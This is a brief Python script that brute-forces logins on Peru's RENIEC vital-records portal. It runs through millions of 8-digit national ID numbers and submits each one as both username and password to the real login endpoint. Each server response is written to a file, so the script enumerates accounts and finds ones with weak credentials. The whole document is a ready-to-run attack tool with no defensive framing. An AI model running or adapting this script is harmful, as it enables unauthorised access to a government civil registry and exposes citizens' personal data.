import requests
#MHK4 CODE
def consulta_usuarios():
    x = 22222222
    while x <= 44444444:
        dni = x
        x += 1
        #GENERAR NUMEROS DE DNI DE 8 DIGITOS.
        url = "https://portalrcm.reniec.gob.pe/hechosvitales/LoginProcess.do"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://portalrcm.reniec.gob.pe",
            "Referer": "https://portalrcm.reniec.gob.pe/hechosvitales/Login.do"
        }
        data = f"accion=REALIZAR_VALIDACION&txtUser={dni}&txtPass={dni}&tipoAcceso=0"
        env = requests.post(url, headers=headers, data=data)
        msj = env.text
        print(f"[{dni}] :::: {msj}")
        f = open ('usuarios.txt','a')
        f.write('\n' + f"[{dni}] :::: {msj}")
        f.close()

if __name__ == "__main__":
    consulta_usuarios()